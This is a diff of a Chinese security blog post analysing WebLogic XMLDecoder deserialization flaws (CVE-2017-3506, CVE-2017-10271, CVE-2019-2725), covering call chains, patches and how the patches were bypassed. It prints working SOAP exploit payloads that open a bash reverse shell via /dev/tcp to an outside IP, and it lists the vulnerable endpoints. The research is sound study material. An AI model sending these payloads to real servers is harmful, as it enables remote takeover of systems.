@@ -6,15 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: CTF | Abyss&#39;s Blog</title>
+  <title>XMLDecoder系列漏洞 | Abyss&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Abyss&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/tags/CTF/index.html">
+  <meta name="description" content="1 参考链接WebLogic安全研究报告浅谈Weblogic反序列化——XMLDecoder的绕过史Weblogic XMLDecoder RCE分析cve-2017-3506&amp;amp;cve-2017-10271WebLogic RCE(CVE-2019-2725)漏洞之旅">
+<meta name="keywords" content="WebLogic,XMLDecoder">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMLDecoder系列漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/03/22/weblogic-xmldecoder-20200322/index.html">
 <meta property="og:site_name" content="Abyss&#39;s Blog">
+<meta property="og:description" content="1 参考链接WebLogic安全研究报告浅谈Weblogic反序列化——XMLDecoder的绕过史Weblogic XMLDecoder RCE分析cve-2017-3506&amp;amp;cve-2017-10271WebLogic RCE(CVE-2019-2725)漏洞之旅">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2020/03/22/weblogic-xmldecoder-20200322/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/22/weblogic-xmldecoder-20200322/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/22/weblogic-xmldecoder-20200322/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/22/weblogic-xmldecoder-20200322/4.png">
+<meta property="og:updated_time" content="2020-03-22T08:51:35.914Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Abyss&#39;s Blog">
+<meta name="twitter:title" content="XMLDecoder系列漏洞">
+<meta name="twitter:description" content="1 参考链接WebLogic安全研究报告浅谈Weblogic反序列化——XMLDecoder的绕过史Weblogic XMLDecoder RCE分析cve-2017-3506&amp;amp;cve-2017-10271WebLogic RCE(CVE-2019-2725)漏洞之旅">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/22/weblogic-xmldecoder-20200322/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Abyss&#39;s Blog" type="application/atom+xml">
   
@@ -148,114 +158,275 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-weblogic-xmldecoder-20200322" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/24/mysql-read-write-file-20190924/" class="archive-article-date">
-  	<time datetime="2019-09-24T03:13:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-24</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/24/mysql-read-write-file-20190924/">Mysql读取/写入文件</a>
+    <h1 class="article-title" itemprop="name">
+      XMLDecoder系列漏洞
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/03/22/weblogic-xmldecoder-20200322/" class="archive-article-date">
+  	<time datetime="2020-03-22T08:45:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-参考链接"><a href="#1-参考链接" class="headerlink" title="1 参考链接"></a>1 参考链接</h1><p><a href="https://paper.seebug.org/1012/" target="_blank" rel="noopener">WebLogic安全研究报告</a><br><a href="https://www.anquanke.com/post/id/180725" target="_blank" rel="noopener">浅谈Weblogic反序列化——XMLDecoder的绕过史</a><br><a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Weblogic XMLDecoder RCE分析</a><br><a href="https://blog.csdn.net/he_and/article/details/90582262" target="_blank" rel="noopener">cve-2017-3506&amp;cve-2017-10271</a><br><a href="https://www.freebuf.com/vuls/202800.html" target="_blank" rel="noopener">WebLogic RCE(CVE-2019-2725)漏洞之旅</a></p>
+<a id="more"></a>
+<h1 id="2-CVE-2017-3506"><a href="#2-CVE-2017-3506" class="headerlink" title="2 CVE-2017-3506"></a>2 CVE-2017-3506</h1><h2 id="2-1-利用"><a href="#2-1-利用" class="headerlink" title="2.1 利用"></a>2.1 利用</h2><p>这应该是最初版本<br>POC</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span> <span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.xmlDecoder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.42/80 0&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试可用的URL收集如下：</p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/wls-wsat/RegistrationPortTypeRPC</td>
+</tr>
+<tr>
+<td>/wls-wsat/CoordinatorPortType</td>
+</tr>
+<tr>
+<td>/wls-wsat/ParticipantPortType</td>
+</tr>
+<tr>
+<td>/wls-wsat/RegistrationRequesterPortType</td>
+</tr>
+<tr>
+<td>/wls-wsat/CoordinatorPortType11</td>
+</tr>
+<tr>
+<td>/wls-wsat/RegistrationPortTypeRPC11</td>
+</tr>
+<tr>
+<td>/wls-wsat/ParticipantPortType11</td>
+</tr>
+<tr>
+<td>/wls-wsat/RegistrationRequesterPortType11</td>
+</tr>
+<tr>
+<td>/_async/AsyncResponseServiceJms</td>
+</tr>
+<tr>
+<td>/_async/AsyncResponseService</td>
+</tr>
+<tr>
+<td>/_async/AsyncResponseServiceHttps</td>
+</tr>
+<tr>
+<td>发包注意<code>Content-Type: text/xml</code></td>
+</tr>
+<tr>
+<td><img src="/2020/03/22/weblogic-xmldecoder-20200322/1.png"></td>
+</tr>
+<tr>
+<td>报错返回了调用栈</td>
+</tr>
+<tr>
+<td><img src="/2020/03/22/weblogic-xmldecoder-20200322/2.png"></td>
+</tr>
+<tr>
+<td>直接针对XMLDecoder部分（因为前面的看不懂），在readHeaderOld方法处设置断点。</td>
+</tr>
+<tr>
+<td>文件路径<code>src\lib\weblogic.jar!\weblogic\wsee\jaxws\workcontext\WorkContextTube.class</code></td>
+</tr>
+<tr>
+<td><strong>WorkContextTube</strong></td>
+</tr>
+<tr>
+<td><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">readHeaderOld</span><span class="params">(Header var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        XMLStreamReader var2 = var1.readHeader();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        XMLStreamReaderToXMLStreamWriter var3 = <span class="keyword">new</span> XMLStreamReaderToXMLStreamWriter();</span><br><span class="line">        ByteArrayOutputStream var4 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);</span><br><span class="line">        var3.bridge(var2, var5);</span><br><span class="line">        var5.close();</span><br><span class="line">        <span class="comment">//执行到这时，var4的值就是java标签开始的XML数据，可看下面截图</span></span><br><span class="line">        <span class="comment">//之后执行了WorkContextXmlInputAdapter构造函数</span></span><br><span class="line">        WorkContextXmlInputAdapter var6 = <span class="keyword">new</span> WorkContextXmlInputAdapter(<span class="keyword">new</span> ByteArrayInputStream(var4.toByteArray()));</span><br><span class="line">        <span class="keyword">this</span>.receive(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var8);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
+</tr>
+</tbody></table>
+<img src="/2020/03/22/weblogic-xmldecoder-20200322/3.png">
+<p>文件路径<code>src\lib\weblogic.jar!\weblogic\wsee\workarea\WorkContextXmlInputAdapter.class</code><br><strong>WorkContextXmlInputAdapter</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建了XMLDecoder对象</span></span><br><span class="line">    <span class="keyword">this</span>.xmlDecoder = <span class="keyword">new</span> XMLDecoder(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后续的调用链比较简单了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WorkContextServerTube.class</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">receive</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        WorkContextMapInterceptor var2 = WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">        var2.receiveRequest(var1);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//WorkContextMapImpl.class</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">receiveRequest</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ((WorkContextMapInterceptor)<span class="keyword">this</span>.getMap()).receiveRequest(var1);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//WorkContextLocalMap.class</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">receiveRequest</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                WorkContextEntry var2 = WorkContextEntryImpl.readEntry(var1);</span><br><span class="line">            ......</span><br><span class="line">            &#125;</span><br><span class="line">        ......</span><br><span class="line">        &#125;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//WorkContextEntryImpl.class</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WorkContextEntry <span class="title">readEntry</span><span class="params">(WorkContextInput var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        String var1 = var0.readUTF();</span><br><span class="line">        <span class="keyword">return</span> (WorkContextEntry)(var1.length() == <span class="number">0</span>?NULL_CONTEXT:<span class="keyword">new</span> WorkContextEntryImpl(var1, var0));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//WorkContextXmlInputAdapter.class</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readUTF</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (String)<span class="keyword">this</span>.xmlDecoder.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-补丁"><a href="#2-2-补丁" class="headerlink" title="2.2 补丁"></a>2.2 补丁</h2><img src="/2020/03/22/weblogic-xmldecoder-20200322/4.png">
+<p>通过补丁可以知道是在<code>WorkContextXmlInputAdapter</code>类中，在生成XMLDecoder对象时，先用<code>SAX</code>对XML数据进行了解析，如果存在<code>object</code>标签则直接抛出异常</p>
+<h1 id="3-CVE-2017-10271"><a href="#3-CVE-2017-10271" class="headerlink" title="3 CVE-2017-10271"></a>3 CVE-2017-10271</h1><h2 id="3-1-利用"><a href="#3-1-利用" class="headerlink" title="3.1 利用"></a>3.1 利用</h2><p>由于<code>CVE-2017-3506</code>的补丁只是禁用了<code>object</code>标签，而<code>void</code>标签是继承与<code>object</code>标签，仅重写了<code>isArgument</code>方法，对导致命令执行毫无影响。<br>POC</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span> <span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.xmlDecoder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.42/80 0&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-2-补丁"><a href="#3-2-补丁" class="headerlink" title="3.2 补丁"></a>3.2 补丁</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         SAXParser parser = factory.newSAXParser();</span><br><span class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</span><br><span class="line">                        &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                     String var9 = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                     <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                     &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-CVE-2019-2725"><a href="#4-CVE-2019-2725" class="headerlink" title="4 CVE-2019-2725"></a>4 CVE-2019-2725</h1><h2 id="4-1-利用"><a href="#4-1-利用" class="headerlink" title="4.1 利用"></a>4.1 利用</h2><p>利用的是二次反序列化，涉及到的类<code>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</code>，该类构造函数会将<code>byte[]</code>反序列化，因此利用XMLDecoder构造该类的实例，传入Java反序列化的payload。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">class</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>oracle.toplink.internal.sessions.UnitOfWorkChangeSet<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"byte"</span> <span class="attr">length</span>=<span class="string">"8970"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">byte</span>&gt;</span>-84<span class="tag">&lt;/<span class="name">byte</span>&gt;</span></span><br><span class="line">                ...</span><br><span class="line">                ...</span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在<code>WebLogic 12.1.3</code>没有<code>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</code>，但有人找到了<code>org.slf4j.ext.EventData</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">EventData</span><span class="params">(String xml)</span> </span>&#123;</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(xml.getBytes());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            XMLDecoder decoder = <span class="keyword">new</span> XMLDecoder(bais);</span><br><span class="line">            <span class="keyword">this</span>.eventData = (Map)decoder.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> EventException(<span class="string">"Error decoding "</span> + xml, var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造函数中直接调用了XMLDecoder的readObject方法</p>
